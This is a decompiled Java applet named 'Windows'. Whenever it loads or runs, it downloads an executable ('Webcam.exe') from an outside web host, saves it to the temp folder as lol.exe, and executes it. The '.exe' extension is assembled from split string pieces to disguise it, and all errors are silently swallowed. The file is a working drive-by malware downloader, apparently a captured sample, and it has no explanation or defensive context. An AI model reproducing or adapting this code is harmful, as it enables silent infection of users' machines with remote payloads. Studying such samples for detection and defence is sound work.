import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.nio.channels.Channels;
import java.net.MalformedURLException;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Windows extends Applet
{
    private static final long serialVersionUID = 1L;
    
    public static void startupAll() {
        try {
            URL url = null;
            final String s = "e";
            final String s2 = "x";
            final String s3 = "lol";
            final Runtime runtime = Runtime.getRuntime();
            final String property = System.getProperty("java.io.tmpdir");
            try {
                url = new URL("http://www.xvisio-live.com/Webcam." + s + s2 + s);
            }
            catch (MalformedURLException ex) {
                ex.printStackTrace();
            }
            final ReadableByteChannel channel = Channels.newChannel(url.openStream());
            final FileOutputStream fileOutputStream = new FileOutputStream(property + s3 + "." + s + s2 + s);
            fileOutputStream.getChannel().transferFrom(channel, 0L, 16777216L);
            fileOutputStream.close();
            channel.close();
            try {
                runtime.exec(property + s3 + "." + s + s2 + s);
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
    
    @Override
    public void init() {
        startupAll();
    }
    
    public void main(final String[] array) {
        startupAll();
    }
}
